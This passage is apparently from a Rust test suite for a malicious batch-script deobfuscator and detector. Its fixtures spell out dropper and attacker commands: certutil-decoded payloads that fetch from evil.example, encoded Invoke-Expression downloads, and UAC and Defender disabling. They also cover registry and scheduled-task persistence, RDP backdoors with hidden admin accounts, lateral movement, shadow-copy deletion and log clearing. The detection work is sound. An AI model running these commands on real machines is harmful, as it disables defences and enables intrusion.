        let report = analyze(script, &AnalyzeConfig::default());
        let downloads: Vec<&Trait> = report
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::Download { .. } | Trait::UrlVariable { .. }))
            .collect();
        for d in &downloads {
            let src = match d {
                Trait::Download { src, .. } => src.as_str(),
                Trait::UrlVariable { url, .. } => url.as_str(),
                _ => continue,
            };
            assert!(
                !src.contains("%%"),
                "noisy unresolved-loop-var URL leaked: {src} (trait={d:?})"
            );
        }
    }

    #[test]
    fn certutil_decode_payload_deob_surfaced_in_parent_output() {
        // Contract_Project_Agreement (d29d…) family: an echo-block
        // accumulates a base64 blob, certutil decodes it to a .bat,
        // and `call` runs it. The decoded payload contains the actual
        // powershell `Invoke-WebRequest -Uri 'URL'` line. Without
        // appending the recursive deob to the parent's `out`, analysts
        // only see the certutil call and base64 — not the reconstructed
        // PS command. User feedback: "command line reconstruction is
        // just as important" as URL extraction.
        let script = b"@echo off\r\n\
            set _t=C:\\Temp\\stage.b64\r\n\
            set _b=C:\\Temp\\stage.bat\r\n\
            (\r\n\
            echo QGVjaG8gb2ZmDQpwb3dlcnNoZWxsIC1jICJJV1IgaHR0cDovL2V2aWwuZXhhbXBsZS9wIg0K\r\n\
            ) > \"%_t%\"\r\n\
            certutil -decode \"%_t%\" \"%_b%\" >nul\r\n\
            call \"%_b%\"\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report
                .deobfuscated
                .contains("==== harrington: decoded child script"),
            "decoded child script banner missing: {:?}",
            report.deobfuscated
        );
        assert!(
            report.deobfuscated.contains("powershell"),
            "decoded PS line not surfaced in parent deob: {:?}",
            report.deobfuscated
        );
        // Banner should appear exactly once even though the recursion
        // walks the modified_filesystem at multiple depths.
        let n = report
            .deobfuscated
            .matches("==== harrington: decoded child script")
            .count();
        assert_eq!(n, 1, "child-script banner duplicated: count={n}");
    }

    #[test]
    fn certutil_decode_self_source_surfaces_inner_batch_url() {
        // The output.bat family decodes the current file (`%~f0`) into a
        // temp .bat and then calls it. The decoded child contains the real
        // URL-bearing command, so the analyzer must treat self-source
        // certutil decode as readable input and recurse into the decoded
        // payload.
        let inner = "@echo off\r\npowershell Invoke-RestMethod api.ipify.org\r\n";
        let encoded = base64::engine::general_purpose::STANDARD.encode(inner.as_bytes());
        let script = format!(
            "@echo off\r\n\
            certutil -f -decode \"%~f0\" \"%TEMP%\\0.bat\" >nul 2>&1\r\n\
            call \"%TEMP%\\0.bat\"\r\n\
            -----BEGIN CERTIFICATE----- {} -----END CERTIFICATE-----\r\n",
            encoded
        );
        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
        let has_url = report
            .traits
            .iter()
            .any(|t| matches!(t, Trait::Download { src, .. } if src.contains("api.ipify.org")));
        assert!(
            has_url || report.deobfuscated.contains("api.ipify.org"),
            "self-source certutil decode did not surface inner URL: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn certutil_decode_reuses_destination_path_across_nested_layers() {
        // Real-world dropper chains often write every stage to the same
        // temp destination (`%TEMP%\0.bat`). We still need to recurse when
        // the bytes change, otherwise the first decoded layer blocks the
        // deeper one.
        let final_payload = "@echo off\r\npowershell Invoke-RestMethod api.ipify.org\r\n";
        let final_b64 = base64::engine::general_purpose::STANDARD.encode(final_payload);
        let inner = format!(
            "@echo off\r\n\
            certutil -f -decode \"%~f0\" \"%TEMP%\\0.bat\" >nul 2>&1\r\n\
            call \"%TEMP%\\0.bat\"\r\n\
            -----BEGIN CERTIFICATE----- {} -----END CERTIFICATE-----\r\n",
            final_b64
        );
        let inner_b64 = base64::engine::general_purpose::STANDARD.encode(inner.as_bytes());
        let outer = format!(
            "@echo off\r\n\
            certutil -f -decode \"%~f0\" \"%TEMP%\\0.bat\" >nul 2>&1\r\n\
            call \"%TEMP%\\0.bat\"\r\n\
            -----BEGIN CERTIFICATE----- {} -----END CERTIFICATE-----\r\n",
            inner_b64
        );
        let report = analyze(outer.as_bytes(), &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("api.ipify.org"),
            "nested certutil chain did not surface deepest payload: {:?}",
            report.deobfuscated
        );
        assert!(
            !report.extracted_ps1.is_empty(),
            "nested certutil chain did not extract powershell payload: {:?}",
            report.extracted_ps1
        );
    }

    #[test]
    fn extracted_powershell_payload_surfaced_with_banner() {
        // SOSTENER family: a CMD bat assembles a base64-encoded PS body
        // (`$ddsdfgo = '<b64>'; iex $oWfdfjfdsuxd`). The PS scanner
        // decodes the base64 to extract URLs, but without surfacing the
        // decoded body in the deob, analysts can't see what the PS
        // actually does (download URLs, reflection, etc.). User feedback:
        // "command lines are just as important". Pure-base64 PS line
        // assembled inline must be visible after decode.
        // Plain "echo Invoke-WebRequest -Uri https://hidden.example/p"
        // base64-encoded (PS body decoded inline):
        // `Invoke-WebRequest -Uri https://hidden.example/p`
        // base64 = SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwczovL2hpZGRlbi5leGFtcGxlL3A=
        let script = b"@echo off\r\n\
            powershell -Command \"$x='SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwczovL2hpZGRlbi5leGFtcGxlL3A='; $y=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x)); Invoke-Expression $y\"\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        // The decoded PS body should be visible in the deob OR the URL
        // should be extracted directly.
        let has_url = report
            .traits
            .iter()
            .any(|t| matches!(t, Trait::Download { src, .. } if src.contains("hidden.example")));
        let has_inline = report.deobfuscated.contains("hidden.example");
        assert!(
            has_url || has_inline,
            "PS payload URL neither extracted nor inline: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn call_script_extension_pushes_implicit_host_trait() {
        // `call X.jS` shellexecutes via wscript (PathExt resolution).
        // harrington's call handler re-feeds via interpret_line, which
        // previously found no matching handler and silently dropped.
        // Now interpret_line pushes a WscriptExec trait so CAPE's
        // depth-2 `wscript X.jS` IOC has a harrington counterpart and the
        // analyst can see the implicit launcher.
        let script = b"@echo off\r\n\
            set TMP=C:\\Temp\r\n\
            echo var x=1 > %TMP%\\foo.js\r\n\
            call %TMP%\\foo.js\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                crate::traits::Trait::WscriptExec { src }
                    if src.to_ascii_lowercase().ends_with("foo.js")
            )),
            "WscriptExec trait not pushed for `call X.js`: traits={:?}",
            report.traits
        );
    }

    #[test]
    fn cmd_vd_c_mashed_flag_enables_delayed_expansion() {
        // `cmd /V/D/c "..."` is a single token mashing three flags. The
        // flags-section parser used to bail because the token's 2-char
        // head was `/V` (not the `/c` trigger), so has_v_on never saw the
        // `/V` and delayed expansion stayed OFF in the child. `!BNYN!`
        // refs inside the body then stayed literal — wrecking the
        // Brazilian banker JS-dropper family (Curriculo, Boleto, …) where
        // every payload is `cmd /V/D/c "...!VAR!..."`.
        let script = b"@echo off\r\ncmd /V/D/c \"set X=resolved&&echo result=!X!\"\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("result=resolved"),
            "/V/D/c mashed flag didn't enable delayed expansion: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn start_process_verb_runas_emits_self_elevation_trait() {
        // `Start-Process … -Verb RunAs` triggers UAC. Dropper families
        // (SKMBT, dropper.bat) use it to relaunch elevated. Surface as
        // a SelfElevation trait so CAPE-vs-harrington compare flags the
        // UAC prompt behavior cleanly.
        let script = b"@echo off\r\npowershell -Command \"Start-Process powershell.exe -Verb RunAs -ArgumentList '-Command echo hi'\"\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        let elevs: Vec<&Trait> = report
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::SelfElevation { .. }))
            .collect();
        assert!(
            !elevs.is_empty(),
            "SelfElevation trait not emitted: traits={:?}",
            report.traits
        );

        // Positional-arg form: `Start-Process 'C:\path\dropper.bat' -Verb runas`
        let script2 = b"@echo off\r\npowershell -Command \"Start-Process 'C:\\Users\\me\\dropper.bat' -Verb runas\"\r\n";
        let report2 = analyze(script2, &AnalyzeConfig::default());
        assert!(
            report2.traits.iter().any(|t| matches!(
                t,
                Trait::SelfElevation { target, .. } if target.contains("dropper.bat")
            )),
            "positional-arg SelfElevation not detected: {:?}",
            report2.traits
        );
    }

    #[test]
    fn uac_policy_weakening_emits_uac_bypass_traits() {
        let script = b"@echo off\r\n\
            reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"EnableLUA\" /t REG_DWORD /d 0 /f\r\n\
            REG ADD HKLM\\software\\microsoft\\windows\\currentversion\\policies\\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\r\n\
            reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\r\n\
            powershell.exe New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        for technique in [
            "uac-enablelua-disabled",
            "uac-consent-prompt-disabled",
            "uac-token-filter-disabled",
        ] {
            assert!(
                report.traits.iter().any(|t| matches!(
                    t,
                    Trait::UacBypass { technique: tk } if tk == technique
                )),
                "missing UacBypass {technique}: {:?}",
                report.traits
            );
        }
    }

    #[test]
    fn reg_add_run_key_emits_persistence_trait() {
        // `reg add HKCU\…\Run /v X /d "C:\dropper.exe" /f` is the
        // classic registry-Run persistence. Surface as Persistence
        // trait so CAPE-vs-harrington compare flags this without the
        // analyst grepping the deob.
        let script = b"@echo off\r\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v evil /d \"C:\\Users\\me\\drop.exe\" /f\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        let p: Vec<&Trait> = report
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::Persistence { .. }))
            .collect();
        assert_eq!(p.len(), 1, "Persistence trait missing: {:?}", report.traits);
        if let Trait::Persistence {
            hive,
            key,
            value_name,
            command,
        } = p[0]
        {
            assert_eq!(hive, "HKCU");
            assert!(key.to_ascii_lowercase().contains("currentversion\\run"));
            assert_eq!(value_name, "evil");
            assert!(command.contains("drop.exe"));
        }
    }

    #[test]
    fn winlogon_shell_value_emits_persistence_trait() {
        let script = b"@echo off\r\n\
reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe,C:\\Users\\Public\\stage.cmd\" /f\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::Persistence {
                    hive,
                    key,
                    value_name,
                    command,
                } if hive == "HKCU"
                    && key == "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
                    && value_name == "Shell"
                    && command.contains("stage.cmd")
            )),
            "Winlogon Shell persistence missing: {:?}",
            report.traits
        );
    }

    #[test]
    fn schtasks_create_emits_persistence_trait() {
        // `schtasks /create /tn X /tr Y` registers a scheduled-task
        // autorun. Same Persistence trait as reg-add Run, with
        // hive=ScheduledTask, key=task-name, command=task-run.
        let script = b"@echo off\r\nschtasks /create /F /tn \"VCC_runner2\" /tr \"cmd.exe /c C:\\evil.exe\" /sc minute /mo 7\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        let p: Vec<&Trait> = report
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::Persistence { hive, .. } if hive == "ScheduledTask"))
            .collect();
        assert_eq!(
            p.len(),
            1,
            "ScheduledTask Persistence missing: {:?}",
            report.traits
        );
        if let Trait::Persistence { key, command, .. } = p[0] {
            assert_eq!(key, "VCC_runner2");
            assert!(command.contains("C:\\evil.exe"));
        }
    }

    #[test]
    fn defender_evasion_traits_detected() {
        // Common AV-evasion patterns: Add-MpPreference exclusion,
        // Set-MpPreference -DisableRealtimeMonitoring $true, sc stop
        // WinDefend, taskkill of security processes, netsh advfirewall
        // set allprofiles state off, and recursive removal of known AV
        // product directories.
        let script = b"@echo off\r\n\
            powershell -c \"Add-MpPreference -ExclusionPath 'C:\\Users\\me\\AppData' ; Set-MpPreference -DisableRealtimeMonitoring $true ; Set-MpPreference -MAPSReporting Disabled\"\r\n\
            sc stop WinDefend\r\n\
            taskkill /IM SecurityHealthSystray.exe /F\r\n\
            netsh advfirewall set allprofiles state off\r\n\
            rmdir /s /q \"C:\\Program Files (x86)\\Trend Micro\" >> C:\\DISKLOG.TXT\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        let actions: Vec<&str> = report
            .traits
            .iter()
            .filter_map(|t| {
                if let Trait::DefenderEvasion { action, .. } = t {
                    Some(action.as_str())
                } else {
                    None
                }
            })
            .collect();
        assert!(
            actions.contains(&"exclusion-path"),
            "missing exclusion-path: {actions:?}"
        );
        assert!(
            actions.contains(&"setmp-disablerealtimemonitoring"),
            "missing rtp disable: {actions:?}"
        );
        assert!(actions.contains(&"sc-stop"), "missing sc-stop: {actions:?}");
        assert!(
            actions.contains(&"taskkill-security-process"),
            "missing taskkill-security-process: {actions:?}"
        );
        assert!(
            actions.contains(&"netsh-fw-off"),
            "missing netsh-fw-off: {actions:?}"
        );
        assert!(
            actions.contains(&"security-product-remove"),
            "missing security-product-remove: {actions:?}"
        );
    }

    #[test]
    fn defender_registry_tampering_emits_evasion_trait() {
        // `reg add ...\Windows Defender\... /v DisableX /d 1` — flips
        // Defender policy keys to disable real-time / anti-spyware /
        // notifications. AV evasion IOC. 5 corpus samples
        // (d5033dd..., eae19989..., 864eedb8..., 68ee8152..., e0374754...)
        // use this exact pattern.
        let script = b"@echo off\r\nREG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /f /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d 1\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::DefenderEvasion { action, target: _ }
                    if action == "regset-disablebehaviormonitoring"
            )),
            "Defender reg-tamper not flagged: traits={:?}",
            report.traits
        );
    }

    #[test]
    fn generic_taskkill_does_not_emit_defender_evasion_trait() {
        let script = b"@echo off\r\ntaskkill /f /im WINWORD.EXE\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            !report.traits.iter().any(|t| matches!(
                t,
                Trait::DefenderEvasion { action, .. } if action == "taskkill-security-process"
            )),
            "generic taskkill should not be DefenderEvasion: {:?}",
            report.traits
        );
    }

    #[test]
    fn defender_security_binary_tampering_emits_evasion_traits() {
        let script = b"@echo off\r\n\
            takeown /f \"C:\\Windows\\System32\\SecurityHealthService.exe\"\r\n\
            icacls \"C:\\Windows\\System32\\SecurityHealthService.exe\" /grant:r \"%USERDOMAIN%\\%USERNAME%\":F /c\r\n\
            rename C:\\Windows\\System32\\SecurityHealthSystray.exe Nurik.nes\r\n\
            icacls \"C:\\Temp\\notes.txt\" /grant:r \"%USERNAME%\":F /c\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        for action in [
            "security-binary-takeown",
            "security-binary-acl-grant",
            "security-binary-rename",
        ] {
            assert!(
                report.traits.iter().any(|t| matches!(
                    t,
                    Trait::DefenderEvasion { action: a, .. } if a == action
                )),
                "missing {action}: {:?}",
                report.traits
            );
        }
        assert!(
            !report.traits.iter().any(|t| matches!(
                t,
                Trait::DefenderEvasion { target, .. } if target.contains("notes.txt")
            )),
            "generic icacls target should not be DefenderEvasion: {:?}",
            report.traits
        );
    }

    #[test]
    fn defender_scheduled_task_disable_emits_evasion_trait() {
        let script = b"@echo off\r\n\
            schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable\r\n\
            schtasks /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" /Disable\r\n\
            schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Enable\r\n\
            schtasks /Change /TN \"\\User\\Maintenance\" /Disable\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        let defender_tasks: Vec<&str> = report
            .traits
            .iter()
            .filter_map(|t| {
                if let Trait::DefenderEvasion { action, target } = t {
                    (action == "scheduled-task-disable").then_some(target.as_str())
                } else {
                    None
                }
            })
            .collect();
        assert!(
            defender_tasks
                .iter()
                .any(|t| t.contains("Windows Defender Scheduled Scan")),
            "missing Defender task disable: {:?}",
            report.traits
        );
        assert!(
            defender_tasks
                .iter()
                .any(|t| t.contains("ExploitGuard MDM policy Refresh")),
            "missing ExploitGuard task disable: {:?}",
            report.traits
        );
        assert!(
            !defender_tasks
                .iter()
                .any(|t| t.contains("Windows Defender Verification")),
            "enabled Defender task should not be evasion: {:?}",
            report.traits
        );
        assert!(
            !defender_tasks.iter().any(|t| t.contains("Maintenance")),
            "unrelated task disable should not be DefenderEvasion: {:?}",
            report.traits
        );
    }

    #[test]
    fn defender_service_registry_disable_emits_evasion_trait() {
        let script = b"@echo off\r\n\
            reg add \"HKLM\\System\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /t REG_DWORD /d \"4\" /f\r\n\
            reg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v Start /t REG_DWORD /d 4 /f\r\n\
            reg add \"HKLM\\System\\CurrentControlSet\\Services\\Dnscache\" /v Start /t REG_DWORD /d 4 /f\r\n\
            reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc\" /v Start /t REG_DWORD /d 2 /f\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        let disabled_services: Vec<&str> = report
            .traits
            .iter()
            .filter_map(|t| {
                if let Trait::DefenderEvasion { action, target } = t {
                    (action == "service-start-disabled").then_some(target.as_str())
                } else {
                    None
                }
            })
            .collect();
        assert!(
            disabled_services.contains(&"WinDefend"),
            "missing WinDefend service disable: {:?}",
            report.traits
        );
        assert!(
            disabled_services.contains(&"SecurityHealthService"),
            "missing SecurityHealthService service disable: {:?}",
            report.traits
        );
        assert!(
            !disabled_services.contains(&"Dnscache"),
            "generic service disable should not be DefenderEvasion: {:?}",
            report.traits
        );
        assert!(
            !disabled_services.contains(&"WdNisSvc"),
            "non-disabled Defender service start value should not be evasion: {:?}",
            report.traits
        );
    }

    #[test]
    fn attachment_policy_weakening_emits_evasion_traits() {
        let script = b"@echo off\r\n\
            Reg Add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations\" /v \"LowRiskFileTypes\" /t REG_SZ /d \".exe;.bat;.cmd;.reg;.msi;\" /f\r\n\
            Reg Add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments\" /v \"HideZoneInfoOnProperties\" /t REG_DWORD /d \"1\" /f\r\n\
            Reg Add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments\" /v \"SaveZoneInformation\" /t REG_DWORD /d \"2\" /f\r\n\
            Reg Add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments\" /v \"SaveZoneInformation\" /t REG_DWORD /d \"1\" /f\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        let targets: std::collections::HashSet<&str> = report
            .traits
            .iter()
            .filter_map(|t| {
                if let Trait::DefenderEvasion { action, target } = t {
                    (action == "attachment-policy-weaken").then_some(target.as_str())
                } else {
                    None
                }
            })
            .collect();
        for target in [
            "LowRiskFileTypes",
            "HideZoneInfoOnProperties",
            "SaveZoneInformation",
        ] {
            assert!(
                targets.contains(target),
                "missing attachment policy weakening {target}: {:?}",
                report.traits
            );
        }
        assert_eq!(
            targets.len(),
            3,
            "benign SaveZoneInformation value should not emit an extra trait: {:?}",
            report.traits
        );
    }

    #[test]
    fn security_product_registry_deletion_emits_evasion_traits() {
        let script = b"@echo off\r\n\
            Reg Delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\MBAMService\" /f\r\n\
            Reg Delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\ekrn\" /f\r\n\
            Reg Delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\GenericUpdater\" /f\r\n\
            Reg Delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"AvastUI.exe\" /f\r\n\
            Reg Delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"COMODO Internet Security\" /f\r\n\
            Reg Delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MyApp\" /f\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        let mut service_targets = std::collections::HashSet::new();
        let mut startup_targets = std::collections::HashSet::new();
        for t in &report.traits {
            if let Trait::DefenderEvasion { action, target } = t {
                match action.as_str() {
                    "security-service-delete" => {
                        service_targets.insert(target.as_str());
                    }
                    "security-startup-delete" => {
                        startup_targets.insert(target.as_str());
                    }
                    _ => {}
                }
            }
        }
        assert!(
            service_targets.contains("MBAMService") && service_targets.contains("ekrn"),
            "missing security service deletes: {:?}",
            report.traits
        );
        assert!(
            !service_targets.contains("GenericUpdater"),
            "generic service delete should not be DefenderEvasion: {:?}",
            report.traits
        );
        assert!(
            startup_targets.contains("AvastUI.exe")
                && startup_targets.contains("COMODO Internet Security"),
            "missing security startup deletes: {:?}",
            report.traits
        );
        assert!(
            !startup_targets.contains("MyApp"),
            "generic startup delete should not be DefenderEvasion: {:?}",
            report.traits
        );
    }

    #[test]
    fn defender_exclusion_target_does_not_cross_line_boundary() {
        let script = b"@echo off\r\n\
            powershell.exe -command \"Add-MpPreference -ExclusionPath \"C:\\\r\n\
            timeout.exe /t 10\r\n\
            cd \"C:\\ProgramData\"\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            !report.traits.iter().any(|t| matches!(
                t,
                Trait::DefenderEvasion { action, target }
                    if action == "exclusion-path" && target.contains("timeout.exe")
            )),
            "Defender exclusion target crossed line boundary: {:?}",
            report.traits
        );
    }

    #[test]
    fn rdp_backdoor_setup_emits_remote_access_traits() {
        let script = b"@echo off\r\n\
            reg add \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f\r\n\
            reg add \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f\r\n\
            reg add \"HKLM\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v defaultuserx /t REG_DWORD /d 0x0 /f\r\n\
            netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in protocol=tcp localport=3389 action=allow\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        for technique in ["rdp-enable", "hidden-user", "rdp-firewall-open"] {
            assert!(
                report.traits.iter().any(|t| matches!(
                    t,
                    Trait::RemoteAccess { technique: tk, .. } if tk == technique
                )),
                "missing RemoteAccess {technique}: {:?}",
                report.traits
            );
        }
    }

    #[test]
    fn rdp_disable_settings_do_not_emit_remote_access_trait() {
        let script = b"@echo off\r\n\
            reg add \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x0 /f\r\n\
            reg add \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x1 /f\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            !report.traits.iter().any(|t| matches!(
                t,
                Trait::RemoteAccess { technique, .. } if technique == "rdp-enable"
            )),
            "RDP disable settings should not be flagged: {:?}",
            report.traits
        );
    }

    #[test]
    fn rdp_session_relaxation_emits_remote_access_traits() {
        let script = b"@echo off\r\n\
            reg add \"HKLM\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"AllowMultipleTSSessions\" /t REG_DWORD /d 0x1 /f\r\n\
            reg add \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"fSingleSessionPerUser\" /t REG_DWORD /d 0x0 /f\r\n\
            reg add \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v \"MaxIdleTime\" /t REG_DWORD /d 0x0 /f\r\n\
            reg add \"HKLM\\system\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v \"MaxConnectionTime\" /t REG_DWORD /d 0x0 /f\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        for technique in [
            "rdp-multiple-sessions",
            "rdp-single-session-disabled",
            "rdp-timeout-disabled",
        ] {
            assert!(
                report.traits.iter().any(|t| matches!(
                    t,
                    Trait::RemoteAccess { technique: tk, .. } if tk == technique
                )),
                "missing RemoteAccess {technique}: {:?}",
                report.traits
            );
        }
    }

    #[test]
    fn net_user_add_and_localgroup_add_emit_account_modification_traits() {
        let script = b"@echo off\r\n\
            net user WDAGUtilltyAccount \"qv69t4p#Z0kE3\" /add\r\n\
            net localgroup Administrators WDAGUtilltyAccount /ADD\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::AccountModification { action, account, .. }
                    if action == "local-user-add" && account == "WDAGUtilltyAccount"
            )),
            "missing local-user-add: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::AccountModification { action, account, group, .. }
                    if action == "localgroup-add"
                        && account == "WDAGUtilltyAccount"
                        && group.as_deref() == Some("Administrators")
            )),
            "missing localgroup-add: {:?}",
            report.traits
        );
    }

    #[test]
    fn inmem_assembly_load_detected_in_extracted_ps_payload() {
        // SOSTENER/banglabillboard family: PS body decoded from base64
        // contains `[System.Reflection.Assembly]::Load(...)`. The
        // detector must run AFTER analyze_extracted_payloads appends
        // the decoded body to the deob; surface InMemoryAssemblyLoad.
        // Use a base64 that decodes to a PS body with the Load call.
        // The PS body: `$x=Get-Content -Raw f.bin; [System.Reflection.Assembly]::Load($x)`
        let body = "$x=Get-Content -Raw f.bin; [System.Reflection.Assembly]::Load($x)";
        use base64::Engine as _;
        let enc = base64::engine::general_purpose::STANDARD.encode(body.as_bytes());
        let script = format!(
            "@echo off\r\npowershell -Command \"$y=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{enc}')); iex $y\"\r\n"
        );
        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::InMemoryAssemblyLoad { variant } if variant == "Load"
            )),
            "InMemoryAssemblyLoad not detected: traits={:?}",
            report.traits
        );
    }

    #[test]
    fn lateral_movement_anti_recovery_probe_enum_traits() {
        let script = b"@echo off\r\n\
            psexec \\\\target.example -u admin -p pass cmd\r\n\
            wmic /node:\"target.example\" process call create \"cmd\"\r\n\
            powershell -c \"Invoke-Command -ComputerName target.example -ScriptBlock { Get-Date }\"\r\n\
            vssadmin delete shadows /all /quiet\r\n\
            bcdedit /set recoveryenabled no\r\n\
            nslookup malicious.example\r\n\
            curl https://api.ipify.org\r\n\
            net user\r\n\
            whoami /priv\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        let kinds: std::collections::HashSet<&str> = report
            .traits
            .iter()
            .filter_map(|t| match t {
                Trait::LateralMovement { .. } => Some("LM"),
                Trait::AntiRecovery { .. } => Some("AR"),
                Trait::NetworkProbe { .. } => Some("NP"),
                Trait::Enumeration { .. } => Some("EN"),
                _ => None,
            })
            .collect();
        for k in ["LM", "AR", "NP", "EN"] {
            assert!(
                kinds.contains(k),
                "missing trait kind {k}; got {kinds:?}; traits={:?}",
                report.traits
            );
        }
        // Specific: psexec/wmic/Invoke-Command should each be a LM
        let lm_tools: Vec<&str> = report
            .traits
            .iter()
            .filter_map(|t| match t {
                Trait::LateralMovement { tool, .. } => Some(tool.as_str()),
                _ => None,
            })
            .collect();
        assert!(lm_tools.contains(&"psexec"));
        assert!(lm_tools.contains(&"wmic"));
        assert!(lm_tools.contains(&"Invoke-Command"));
    }

    #[test]
    fn evidence_cleanup_artifacts_emit_traits() {
        let script = b"@echo off\r\n\
            wevtutil cl Security\r\n\
            del /s /f /q C:\\Windows\\Prefetch\\*.*\r\n\
            del /s /f /q \"%APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*.*\"\r\n\
            reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\" /f\r\n\
            reg delete \"HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\" /f\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        for action in [
            "event-log-clear",
            "prefetch-delete",
            "recent-items-delete",
            "registry-history-delete",
        ] {
            assert!(
                report.traits.iter().any(|t| matches!(
                    t,
                    Trait::EvidenceCleanup { action: a, .. } if a == action
                )),
                "missing EvidenceCleanup {action}: {:?}",
                report.traits
            );
        }
    }

    #[test]
    fn generic_delete_does_not_emit_evidence_cleanup_trait() {
        let script = b"@echo off\r\n\
            del /f /q C:\\Temp\\installer.log\r\n\
            reg delete \"HKCU\\Software\\Example\\Cache\" /f\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::EvidenceCleanup { .. })),
            "generic cleanup should not be EvidenceCleanup: {:?}",
            report.traits
        );
    }

    #[test]
    fn goto_with_punctuation_prefix_resolves() {
        // xeno-class goto-bytecode: `goto ,;;; 311144` resolves to
        // `goto 311144` in real CMD because `,` and `;` are token
